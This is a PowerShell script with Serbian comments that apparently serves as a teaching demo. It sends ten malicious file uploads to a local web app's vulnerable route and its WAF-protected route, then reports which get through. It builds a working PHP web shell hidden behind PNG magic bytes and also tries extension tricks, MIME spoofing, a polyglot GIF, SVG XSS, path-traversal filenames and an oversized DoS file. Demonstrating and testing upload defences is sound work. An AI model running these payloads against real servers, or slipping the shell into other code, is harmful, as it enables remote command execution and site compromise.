<#
    run_attacks.ps1 - automatizovani paket file upload napada.

    Salje niz zlonamernih fajlova na izabranu rutu i ispisuje HTTP status
    i odgovor servera. Sluzi za demonstraciju:
      - na RANJIVOJ ruti svi napadi prolaze (status "uploaded"),
      - na ZASTICENOJ ruti WAF treba da ih odbije.

    Pokretanje:
      # prvo u drugom terminalu: php artisan serve --port=8585
      ./attacks/run_attacks.ps1                    # default: ranjiva ruta
      ./attacks/run_attacks.ps1 -Route secure      # zasticena ruta (WAF)
      ./attacks/run_attacks.ps1 -BaseUrl http://127.0.0.1:8000 -Route vulnerable

    Zahteva: curl.exe (dolazi uz Windows 10/11).
#>

param(
    [string]$BaseUrl = "http://127.0.0.1:8585",
    [ValidateSet("vulnerable", "secure")]
    [string]$Route = "vulnerable"
)

$ErrorActionPreference = "Stop"
$target = "$BaseUrl/$Route/upload"
$payloadDir = Join-Path $PSScriptRoot "payloads"
$workDir = Join-Path $PSScriptRoot "_generated"
New-Item -ItemType Directory -Force -Path $workDir | Out-Null

Write-Host "==================================================================="
Write-Host " Meta: $target"
Write-Host "===================================================================`n"

# Generisi binarne / velike payload-e koji se ne cuvaju u repo.
# 1) Laznia PNG: validan PNG potpis (magic bytes) + ugradjen PHP kod.
$fakePng = Join-Path $workDir "fake_image.png"
$pngMagic = [byte[]](0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A)
$phpBody  = [System.Text.Encoding]::ASCII.GetBytes("`n<?php echo 'PNG-MAGIC SHELL OK: '; system(`$_GET['cmd'] ?? 'whoami'); ?>")
[IO.File]::WriteAllBytes($fakePng, $pngMagic + $phpBody)

# 2) Preveliki fajl (DoS) - 15 MB nula.
$bigFile = Join-Path $workDir "large.bin"
$fs = [IO.File]::Create($bigFile)
$fs.SetLength(15MB)
$fs.Close()

# Helper: salje jedan napad preko curl.exe i ispisuje rezultat.
function Send-Attack {
    param(
        [string]$Naziv,       # opis napada
        [string]$Path,        # putanja do fajla na disku
        [string]$Filename,    # ime koje se salje serveru (multipart filename)
        [string]$Mime         # deklarisani Content-Type (opciono)
    )

    $formField = "file=@$Path"
    if ($Filename) { $formField += ";filename=$Filename" }
    if ($Mime)     { $formField += ";type=$Mime" }

    Write-Host "[*] $Naziv" -ForegroundColor Cyan
    Write-Host "    -> $formField"

    # -s tih, -w ispis HTTP statusa na kraju; -join spaja linije u jedan string
    $resp = (& curl.exe -s -w "`nHTTP_STATUS:%{http_code}" -X POST $target `
        -H "Accept: application/json" -F $formField) -join "`n"

    $body = ($resp -split "HTTP_STATUS:")[0].Trim()
    $code = ($resp -split "HTTP_STATUS:")[1]

    if ([int]$code -ge 400) {
        Write-Host "    BLOKIRANO (HTTP $code)" -ForegroundColor Green
    } else {
        Write-Host "    PROSLO (HTTP $code)" -ForegroundColor Red
    }
    Write-Host "    $body`n"
}

# ---- NAPADI ----

# 1. Obican PHP web shell.
Send-Attack "PHP web shell (.php)" `
    (Join-Path $payloadDir "shell.php") "shell.php" ""

# 2. Alternativna PHP ekstenzija.
Send-Attack "Alternativna ekstenzija (.phtml)" `
    (Join-Path $payloadDir "shell.phtml") "shell.phtml" ""

# 3. Dupla ekstenzija - pravi .php na kraju.
Send-Attack "Dupla ekstenzija (shell.jpg.php)" `
    (Join-Path $payloadDir "shell.php") "shell.jpg.php" ""

# 4. Dupla ekstenzija - .jpg na kraju (Apache AddHandler bypass).
Send-Attack "Dupla ekstenzija (shell.php.jpg)" `
    (Join-Path $payloadDir "shell.php") "shell.php.jpg" ""

# 5. MIME spoofing - PHP fajl deklarisan kao slika.
Send-Attack "MIME spoofing (php kao image/png)" `
    (Join-Path $payloadDir "shell.php") "shell.php" "image/png"

# 6. Magic bytes spoofing - validan PNG potpis + ugradjen PHP.
Send-Attack "Magic bytes spoof (fake_image.png)" `
    $fakePng "avatar.php" "image/png"

# 7. Polyglot GIF (GIF89a + PHP).
Send-Attack "Polyglot GIF (.gif sa PHP kodom)" `
    (Join-Path $payloadDir "polyglot.gif") "polyglot.php" ""

# 8. SVG sa ugradjenim JavaScript-om (stored XSS).
Send-Attack "SVG XSS (.svg sa <script>)" `
    (Join-Path $payloadDir "xss.svg") "logo.svg" "image/svg+xml"

# 9. Path traversal preko imena fajla.
Send-Attack "Path traversal u imenu (../../evil.php)" `
    (Join-Path $payloadDir "shell.php") "../../evil.php" ""

# 10. Preveliki fajl (DoS).
Send-Attack "Preveliki fajl (15MB)" `
    $bigFile "huge.bin" "application/octet-stream"

Write-Host "==================================================================="
Write-Host " Gotovo. Na ranjivoj ruti ocekujemo da SVE prodje (crveno),"
Write-Host " a na zasticenoj da WAF SVE blokira (zeleno)."
Write-Host "==================================================================="
